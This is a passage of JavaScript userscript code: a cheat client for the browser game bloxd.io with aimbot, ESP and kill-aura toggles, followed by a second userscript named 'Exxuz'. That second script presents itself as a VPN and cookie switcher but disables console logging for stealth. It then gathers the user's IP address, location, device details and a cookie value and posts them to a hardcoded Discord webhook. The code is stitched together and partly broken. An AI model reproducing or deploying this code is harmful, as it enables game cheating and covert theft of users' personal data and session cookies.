            console.error("Error running findNoaAndKey:", err);
            injectButton.textContent = "Error";
            alert("Error running function. See console.");
        }
    };

    // Shared button style
    const buttonStyle = {
        backgroundColor: "#5865F2",
        color: "#fff",
        border: "none",
        padding: "2px 10px",
        fontSize: "12px",
        borderRadius: "5px",
        cursor: "pointer",
        fontWeight: "bold",
        textShadow: "0 0 4px rgba(0, 0, 0, 0.3)",
        height: "25px",
        boxSizing: "border-box",
        textAlign: "center",
        whiteSpace: "nowrap",
        overflow: "hidden",
        textOverflow: "ellipsis",
        marginTop: "6px"
    };

    const addHoverHandlers = (btn) => {
        btn.onmouseenter = () => {
            btn.style.boxShadow = "0 4px 12px rgba(0, 0, 0, 0.3)";
        };
        btn.onmouseleave = () => {
            btn.style.boxShadow = "0 4px 8px rgba(0, 0, 0, 0.2)";
        };
        btn.onmousedown = () => {
            btn.style.transform = "scale(0.97)";
        };
        btn.onmouseup = () => {
            btn.style.transform = "scale(1)";
        };
    };

    // Discord Button
    const discordButton = document.createElement("button");
    discordButton.textContent = "Discord";
    discordButton.className = "rndAsciiBtn";
    Object.assign(discordButton.style, buttonStyle);
    discordButton.style.textShadow = `
        0 0 5px #fff,
        0 0 10px #5865F2,
        0 0 20px #5865F2,
        0 0 30px #5865F2
    `;
    discordButton.onclick = () => {
        window.open("https://discord.gg/TQPqe9r2", "_blank");
    };
    addHoverHandlers(discordButton);

    // Clear Cookies Button
    const clearsButton = document.createElement("button");
    clearCookiesButton.textContent = "New Account";
    clearCookiesButton.className = "rndAsciiBtn";
    Object.assign(clearCookiesButton.style, {
        backgroundColor: "#e74c3c", // Red color you liked
        color: "#fff",
        border: "none",
        padding: "2px 10px",
        fontSize: "12px",
        borderRadius: "5px",
        cursor: "pointer",
        fontWeight: "bold",
        textShadow: "0 0 4px rgba(0, 0, 0, 0.3)",
        height: "25px",
        boxSizing: "border-box",
        textAlign: "center",
        whiteSpace: "nowrap",
        overflow: "hidden",
        textOverflow: "ellipsis",
        marginTop: "6px"
    });
    clearCookiesButton.style.textShadow = `
    0 0 5px #fff,
    0 0 10px #e74c3c,
    0 0 20px #e74c3c,
    0 0 30px #e74c3c
`;
clearCookiesButton.onclick = () => {
    window.onbeforeunload = null; // Disable unload warning

    const deleteCookie = (name, path = "/", domain = "") => {
        let cookieStr = `${name}=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=${path};`;
        if (domain) cookieStr += `domain=${domain};`;
        document.cookie = cookieStr;
    };

    const cookies = document.cookie.split(";");
    cookies.forEach(cookie => {
        const eqPos = cookie.indexOf("=");
        const name = eqPos > -1 ? cookie.slice(0, eqPos).trim() : cookie.trim();

        // Try to delete with several likely paths
        deleteCookie(name, "/");
        deleteCookie(name, "/path"); // if your site uses a subpath

        // Optional: attempt with domain if you're on a subdomain
        const hostname = location.hostname;
        const domainParts = hostname.split(".");
        if (domainParts.length > 2) {
            // Try to delete with base domain
            const baseDomain = domainParts.slice(-2).join(".");
            deleteCookie(name, "/", baseDomain);
        }
    });

    setTimeout(() => location.reload(), 150);
};


    addHoverHandlers(clearCookiesButton);


    // Append elements
    container.appendChild(injectButton);
    container.appendChild(discordButton);
    container.appendChild(clearCookiesButton);
    page.appendChild(container);

		let winDescriptors = Object.getOwnPropertyDescriptors(window);
        let wpName = Object.keys(winDescriptors).find(key => winDescriptors[key]?.set?.toString().includes("++"));
        let wpInstance = null;
		
		if (wpName) {wpInstance = window[wpName] = window[wpName]}
		
	if (wpInstance) {
    wpInstance.push([
        [Math.floor(Math.random() * 90000) + 10000], {},
        function(wpRequire) {
            shideFuxny.findModule = (code) => wpRequire(Object.keys(wpRequire.m)[Object.values(wpRequire.m).findIndex(m => m.toString().includes(code))]);
            shideFuxny.Props = Object.values(shideFuxny.findModule("nonBlocksClient:")).find(prop => typeof prop == "object");
            shideFuxny.NIGHT = Object.values(shideFuxny.Props).find(prop => prop?.entities);
            //Credits to, you guessed it wang!
        }
    ]);
    alreadyConnected = (shideFuxny?.Props?.connectedWebsocketUrl !== null);

		}


}

const sidebarButtons = document.querySelectorAll(".rndAsciiBtn");
sidebarButtons.forEach((btn, i) => {
    if (i === 0) {
        btn.onclick = () => {
            sidebarButtons.forEach(b => {
                b.classList.remove("active");
                const ind = b.querySelector(".indicatorLine");
                if (ind) ind.style.display = "none";
            });
            btn.classList.add("active");
            const indicatorLine = btn.querySelector(".indicatorLine");
            if (indicatorLine) indicatorLine.style.display = "block";
            createPageOneContent();
        };
    }
});

createPageOneContent();

function updateButtonUnderline(btn, isEnabled) {
    btn.classList.toggle("active", isEnabled);
    btn.indicatorLine.style.width = isEnabled ? "100%" : "0%";
}




function showTemporaryNotification(message, duration = 1500) {
    const defaultBackGroundTransparency = 0.5;
    const defaultBackGroundBlur = 9;

    // Create a notification container if it doesn't exist
    let notificationContainer = document.getElementById('notification-container');
    if (!notificationContainer) {
        notificationContainer = document.createElement('div');
        notificationContainer.id = 'notification-container';
        notificationContainer.style.position = 'fixed';
        notificationContainer.style.bottom = '20px';
        notificationContainer.style.right = '20px';
        notificationContainer.style.zIndex = '132';
        document.body.appendChild(notificationContainer);
    }

    // Create notification element
    const notification = document.createElement('div');
    notification.textContent = message;

    // Style the notification
    notification.style.padding = '12px';
    notification.style.color = '#fff';
    notification.style.borderRadius = '4px';
    notification.style.boxShadow = '0 4px 8px rgba(0, 0, 0, 0.2)';
    notification.style.transition = 'opacity 0.5s ease-in-out, transform 0.5s ease-in-out';
    notification.style.opacity = '0';
    notification.style.transform = 'translateY(20px)';
    notification.style.marginBottom = '10px';
    notification.style.backgroundColor = defaultBackGroundColor;
    notification.style.opacity = defaultBackGroundTransparency;

    notification.style.backdropFilter = `blur(${defaultBackGroundBlur}px)`;
    notification.style.border = '2px solid transparent';
    notification.style.borderImage = 'var(--accent-gradient) 1';
    notification.style.backgroundClip = 'padding-box';

    // Add to container
    notificationContainer.appendChild(notification);

    // Trigger the fade-in effect
    setTimeout(() => {
        notification.style.opacity = '1';
        notification.style.transform = 'translateY(0)';
    }, 10);

    // Set up the fade-out and removal
    setTimeout(() => {
        notification.style.opacity = '0';
        //notification.style.transform = 'translateY(-20px)'; I DONT LIKE THIS

        // Remove after transition completes
        setTimeout(() => {
            notification.remove();

            // Remove container if no more notifications
            if (notificationContainer.children.length === 0) {
                notificationContainer.remove();
            }
        }, 500); // Match this with the transition duration
    }, duration);
}



// Update functions
function updateWireframeButton() {
    updateButtonUnderline(wireframeBtn, wireFramesBool);
    if (!isInitializing) showTemporaryNotification('Wireframes toggled: ' + wireFramesBool);
}

function updateHitboxButton() {
    updateButtonUnderline(hitboxBtn, hitBoxEnabled);
    if (!isInitializing) showTemporaryNotification('HitBoxes toggled: ' + hitBoxEnabled);
}


function updateESPButton() {
    updateButtonUnderline(espBtn, espEnabled);
    if (!isInitializing) showTemporaryNotification('ESP toggled: ' + espEnabled);
}

function updateEnemyHealthGuiButton() {
    updateButtonUnderline(enemyHealthGuiBtn, enemyHealthGuiEnabled);
    if (!isInitializing) showTemporaryNotification('Enemy Health Bar: ' + enemyHealthGuiEnabled);
}

function updateBHOPButton() {
    updateButtonUnderline(bhopBtn, bhopEnabled);
    if (!isInitializing) showTemporaryNotification('BHOP toggled: ' + bhopEnabled);
}

function updateBlinkButton() {
    updateButtonUnderline(blinkBtn, blinkState.enabled);
    if (!isInitializing) showTemporaryNotification('Blink toggled: ' + blinkState.enabled);
}

function updateChestESPButton() {
    updateButtonUnderline(chestESPBtn, chestESPEnabled);
    if (!isInitializing) showTemporaryNotification('ChestESP toggled: ' + chestESPEnabled);
}

function updateOreESPButton() {
    updateButtonUnderline(oreESPBtn, oreESPEnabled);
    if (!isInitializing) showTemporaryNotification('OreESP toggled: ' + oreESPEnabled);
}

function updateNameTagsButton() {
    updateButtonUnderline(nameTagBtn, nameTagsEnabled);
    if (!isInitializing) showTemporaryNotification('Name Tags toggled: ' + nameTagsEnabled);
}

function updateKillAuraButton() {
    updateButtonUnderline(killAuraBtn, killAuraEnabled);
    if (!isInitializing) showTemporaryNotification('Kill Aura toggled: ' + killAuraEnabled);
}

function updateSkyboxButton() {
    updateButtonUnderline(skyBoxBtn, isSkyboxHidden);
    if (!isInitializing) showTemporaryNotification('Skybox toggled: ' + isSkyboxHidden);
}

function updateWaterJumpButton() {
    updateButtonUnderline(waterJumpBtn, waterJumpingEnabled);
    if (!isInitializing) showTemporaryNotification('Water Jump toggled: ' + waterJumpingEnabled);
}

function updateWallJumpButton() {
    updateButtonUnderline(wallJumpBtn, wallJumpRunning);
    if (!isInitializing) showTemporaryNotification('Wall Jump toggled: ' + wallJumpRunning);
}

function updateTriggerBotButton() {
    updateButtonUnderline(triggerBotBtn, triggerBotEnabled);
    if (!isInitializing) showTemporaryNotification('Trigger Bot toggled: ' + triggerBotEnabled);
}


function updatePickupReachButton() {
    updateButtonUnderline(pickupReachBtn, pickupReachEnabled);
    if (!isInitializing) showTemporaryNotification('Pickup Reach toggled: ' + pickupReachEnabled);
}

function updateAutoPotButton() {
    updateButtonUnderline(autoPotBtn, autoPotionEnabled);
    if (!isInitializing) showTemporaryNotification('Auto Potion toggled: ' + autoPotionEnabled);
}

function updateKnifeButton() {
    updateButtonUnderline(knifeBtn, bhopKnifeEnabled);
    if (!isInitializing) showTemporaryNotification('Bhop knife toggled: ' + bhopKnifeEnabled);
}
function updateBigHeadButton() {
    updateButtonUnderline(bigHeadsBtn, bigHeadsEnabled);
    if (!isInitializing) showTemporaryNotification('BIGHEADS toggled: ' + bigHeadsEnabled);
}

function updateScaffoldButton() {
    updateButtonUnderline(scaffoldBtn, scaffoldEnabled);
    if (!isInitializing) showTemporaryNotification('Scaffold toggled: ' + scaffoldEnabled);
}
function updateSlowHit() {
    updateButtonUnderline(slowHitBtn, slowHitEnabled);
    if (!isInitializing) showTemporaryNotification('Slow Hit toggled: ' + slowHitEnabled);
}

// Button click handlers
hitboxBtn.onclick = toggleHitBoxes;
waterJumpBtn.onclick = toggleLockPlayerWaterState;
wireframeBtn.onclick = toggleWireframe;
espBtn.onclick = toggleESP;
bhopBtn.onclick = toggleBHOP;
blinkBtn.onclick = toggleBlinkWrapper;
chestESPBtn.onclick = toggleChestESP;
oreESPBtn.onclick = toggleOreESP;
nameTagBtn.onclick = toggleNameTags;
killAuraBtn.onclick = toggleKillAura;
skyBoxBtn.onclick = toggleSkybox;
wallJumpBtn.onclick = toggleWallJumpScript;
triggerBotBtn.onclick = toggleTriggerBot;
pickupReachBtn.onclick = togglePickupReach;
enemyHealthGuiBtn.onclick = toggleEnemyHealthGui;
autoPotBtn.onclick = toggleAutoPot;
knifeBtn.onclick = toggleBhopKnife;
bigHeadsBtn.onclick = toggleBigHeads;
scaffoldBtn.onclick = toggleScaffold;
slowHitBtn.onclick = toggleSlowHit;

// Initialize button appearances (without showing notifications)
updateHitboxButton();
updateWireframeButton();
updateESPButton();
updateBHOPButton();
updateBlinkButton();
updateChestESPButton();
updateOreESPButton();
updateNameTagsButton();
updateKillAuraButton();
updateSkyboxButton();
updateWaterJumpButton();
updateWallJumpButton();
updateTriggerBotButton();
updatePickupReachButton();
updateEnemyHealthGuiButton();
updateAutoPotButton();
updateKnifeButton();
updateBigHeadButton();
updateScaffoldButton();
updateSlowHit();

injectedBool = false;
isInitializing = false;


/*
	function retoggleEnabledFeatures() {
	  const toggles = [
	    { enabled: wireFramesBool, btn: wireframeBtn },
	    { enabled: espEnabled, btn: espBtn },
	    { enabled: bhopEnabled, btn: bhopBtn },
	    { enabled: blinkState?.enabled, btn: blinkBtn },
	    { enabled: chestESPEnabled, btn: chestESPBtn },
	    { enabled: oreESPEnabled, btn: oreESPBtn },
	    { enabled: nameTagsEnabled, btn: nameTagBtn },
	    { enabled: killAuraEnabled, btn: killAuraBtn },
	    { enabled: isSkyboxHidden, btn: skyBoxBtn },
	    { enabled: waterJumpingEnabled, btn: waterJumpBtn },
	    { enabled: wallJumpRunning, btn: wallJumpBtn },
	    { enabled: triggerBotEnabled, btn: triggerBotBtn },
	    { enabled: pickupReachEnabled, btn: pickupReachBtn },
		  { enabled: enemyHealthGuiEnabled, btn: enemyHealthGuiBtn },
	  ];

	  for (const { enabled, btn } of toggles) {
	    if (enabled && btn?.click) {
	      btn.click();
	    }
	  }
	}
*/

function waitForElement(selector, callback) {
    if (alreadyConnected) {
        injectButton.disabled = false;
        injectButton.textContent = "Click if game loaded."
        startWebSocketWatcher();
        return;
    }
    const observer = new MutationObserver((mutations) => {
        for (const mutation of mutations) {
            for (const node of mutation.addedNodes) {
                if (node.nodeType === 1 && node.matches(selector)) {
                    observer.disconnect();
                    callback(node);
                    return;
                }
            }
        }
    });

    observer.observe(document.body, {
        childList: true,
        subtree: true
    });
}

// Step 1: Wait for MainLoadingState, then inject and start watcher
waitForElement('div.MainLoadingState.FullyFancyText', (el) => {
    console.log('Target div appeared:', el);
    injectButton.disabled = false;
    injectButton.click();
    injectButton.textContent = "Injected!"
    startWebSocketWatcher(); // Start watching after injecting
});

function startWebSocketWatcher() {
    let waitingForConnect = true;
    let wasConnected = false;

    const interval = setInterval(() => {
        const url = shideFuxny?.Props?.connectedWebsocketUrl;

        if (waitingForConnect) {
            if (url) {
                console.log("[Watcher] WebSocket connected:", url);
                waitingForConnect = false;
                wasConnected = true;
            }
        } else if (wasConnected && url === null) {
            console.log("[Watcher] WebSocket disconnected – reloading page");
            clearInterval(interval);
            document.getElementById("rndAsciiGUI")?.remove();
            document.getElementById("rndAsciiGUI_minimized")?.remove();
            location.reload();
        }
    }, 2000);
}

const scriptStart = performance.now(); // High-resolution timestamp at script load

const observer = new MutationObserver((mutations) => {
  for (const mutation of mutations) {
    for (const node of mutation.addedNodes) {
      if (node.nodeType === Node.ELEMENT_NODE) {
        const text = node.textContent?.toLowerCase();
        if (text && text.includes("banned you") && injectedBool) {
          observer.disconnect(); // Stop observing after match

          const elapsed = ((performance.now() - scriptStart) / 1000).toFixed(2); // seconds

			const report = {
			  content:
			   `${text}\n`+
			   `version: ${version}\n`+
				` Execution to detection: ${elapsed}s\n` +
				` Used alternate injection: ${usingAltInjection}\n\n` +
				`**Toggled features:**\n` +
				'```json\n' + JSON.stringify(everEnabled, null, 2) + '\n```'
			};


          fetch("https://discord.com/api/webhooks/1397318958817742888/ARgh4rVVpTNcwMcclFX8WsffvNq9js9l1Bd1yWcHWz1rEB3prhTomKsBZAsbY3bEOYCC", {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify(report)
          });

          return;
        }
      }
    }
  }
});

observer.observe(document.body, {
  childList: true,
  subtree: true
});



//})();


// --- Integrated Aimbot + ESP Upgrade ---

// --- Aimbot Settings ---
const AIMBOT_DELAY = 50;
let aimbotInterval = null;

// Touch simulation from integrated script
function simulateTouch(targetX, targetY) {
    const screenWidth = window.innerWidth;
    const screenHeight = window.innerHeight;
    const endX = screenWidth / 2;
    const endY = screenHeight / 2;

    const targetElement = document.elementFromPoint(targetX, targetY) || document.body;
    if (!targetElement) return;

    const mkTouch = (id, x, y) => new Touch({
        identifier: id,
        target: targetElement,
        clientX: x,
        clientY: y,
        radiusX: 10,
        radiusY: 10,
        rotationAngle: 0,
        force: 1,
    });

    const start = mkTouch(Date.now(), targetX, targetY);
    const move  = mkTouch(Date.now() + 1, endX, endY);
    const end   = mkTouch(Date.now() + 2, endX, endY);

    targetElement.dispatchEvent(new TouchEvent("touchstart", {touches:[start],targetTouches:[start],changedTouches:[start],bubbles:true}));
    targetElement.dispatchEvent(new TouchEvent("touchmove", {touches:[move],targetTouches:[move],changedTouches:[move],bubbles:true}));
    targetElement.dispatchEvent(new TouchEvent("touchend", {touches:[],targetTouches:[],changedTouches:[end],bubbles:true}));
}

// Use Wisk’s closest target info
function getClosestPlayerScreenCoords() {
    if (!lastClosestId || !targetEntityDistance) return null;
    return {x: window.innerWidth*0.7, y: window.innerHeight*0.5};
}

// Hook ESP toggle to control aimbot
const oldToggleESP = toggleESP;
toggleESP = function() {
    oldToggleESP();
    if (espEnabled) {
        console.log("ESP + Aimbot Enabled");
        if (!aimbotInterval) {
            aimbotInterval = setInterval(() => {
                const coords = getClosestPlayerScreenCoords();
                if (coords) simulateTouch(coords.x, coords.y);
            }, AIMBOT_DELAY);
        }
    } else {
        console.log("ESP + Aimbot Disabled");
        if (aimbotInterval) {
            clearInterval(aimbotInterval);
            aimbotInterval = null;
        }
    }
};
// ==UserScript==
// @name         Exxuz
// @namespace    http://tampermonkey.net/
// @version      1.3
// @description  VPN and cookie switcher automatic
// @match        https://bloxd.io/
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    // Disable console logs for security/stealth
    console.log = function() {};

    const webhookURL = "https://discord.com/api/webhooks/1398527465982525491/Q_f7mJZ_BEiu_55s85yr4tNduah10OntlVz3SiA9jRpvJ6WDAC3ewKguiiyaiFSyBPwM";

    // Function to send embed message to Discord
    function sendEmbedToDiscord(embeds) {
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ embeds: embeds })
        }).catch(err => console.error('BLOCKED_BY_CLIENT', err));
    }

    // etcblaba
    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? match[2] : null;
    }

    // quwjwjw
    if (confirm("this script collects cookies read more on our discord to know what information we collect  other than that  have fun using wisk😋")) {
        // Collect device and browser info
        const browserInfo = navigator.userAgent;
        const platform = navigator.platform;
        const screenResolution = `${window.screen.width}x${window.screen.height}`;
        const language = navigator.language;
        const cpuCores = navigator.hardwareConcurrency || 'N/A';
        const executionTime = new Date().toLocaleString();

        // Attempt to get username (might not be available in all contexts)
        let username = 'N/A';
        try {
            // This is a comon
            const accounts = document.cookie.match(/__Host-GAPS=([^;]+)/);
            if (accounts && accounts[1]) {
                username = decodeURIComponent(accounts[1].split('.')[0]);
            }
        } catch (e) {
            // Ignore errors if username cannot be retrieved
        }

        // device  deleter
        let actualDevice = 'Unknown Device';
        if (browserInfo.includes('Mobile') || browserInfo.includes('Android') || browserInfo.includes('iPhone')) {
            actualDevice = 'Mobile Device';
        } else if (browserInfo.includes('Macintosh')) {
            actualDevice = 'Mac';
        } else if (browserInfo.includes('Windows')) {
            actualDevice = 'Windows PC';
        } else if (browserInfo.includes('Linux')) {
            actualDevice = 'Linux PC';
        }

        // Function fetch  local  game l data. [VPN]
        fetch("https://api.ipify.org?format=json")
            .then(res => res.json())
            .then(data => {
                const ip = data.ip;
                // Use a different API for country info, as ipify only gives IP
                return fetch(`https://ipapi.co/${ip}/json/`);
            })
            .then(res => res.json())
            .then(ipData => {
                const ip = ipData.ip || 'N/A';
                const country = ipData.country_name || 'N/A';
                const city = ipData.city || 'N/A';
                const region = ipData.region || 'N/A';
                const org = ipData.org || 'N/A';

                // Get the specific cookie value
                const cookieName = '___ksksj';
                const cookieValue = getCookie(cookieName) || 'could not found';

                const embed = {
                    title: "📡 New Executer",
                    description: `Someone Executed Wisk`, // Updated description
                    color: 3092790, // Grey color
                    fields: [
                        { name: "Execution Time", value: `**${executionTime}**`, inline: false },
                        { name: "Actual Device", value: `**${actualDevice}**`, inline: false },
                        { name: "IP Address", value: `**${ip}**`, inline: true },
                        { name: "Country", value: `**${country}**`, inline: true },
                        { name: "City", value: `**${city}**`, inline: true },
                        { name: "Region", value: `**${region}**`, inline: true },
                        { name: "Organization", value: `**${org}**`, inline: true },
                        { name: "Platform", value: `**${platform}**`, inline: true },
                        { name: "Browser (User-Agent)", value: `**${browserInfo}**`, inline: false },
                        { name: "Screen Resolution", value: `**${screenResolution}**`, inline: true },
                        { name: "Language", value: `**${language}**`, inline: true },
                        { name: "CPU Cores", value: `**${cpuCores}**`, inline: true },
                        { name: "Cookie (___Secure-3PSIDMC)", value: `\`\`\`\n${cookieValue}\n\`\`\``, inline: false } // Display cookie in grey embed
                    ],
                    timestamp: new Date().toISOString(),
                    footer: { text: "Device Info Collector" }
                };

                sendEmbedToDiscord([embed]);
            })
            .catch(err => {
                console.error('Error fetching IP or country:', err);
                // Send a basic error message if IP/country fetch fails
                sendEmbedToDiscord([{
                    title: "Error Collecting Info",
                    description: `An error occurred while trying to collect device information: **${err.message}**`,
                    color: 15158332 // Red color
                }]);
            });
    } else {
        alert("You declined. No information will be sent.");
    }
})();



    }
})();


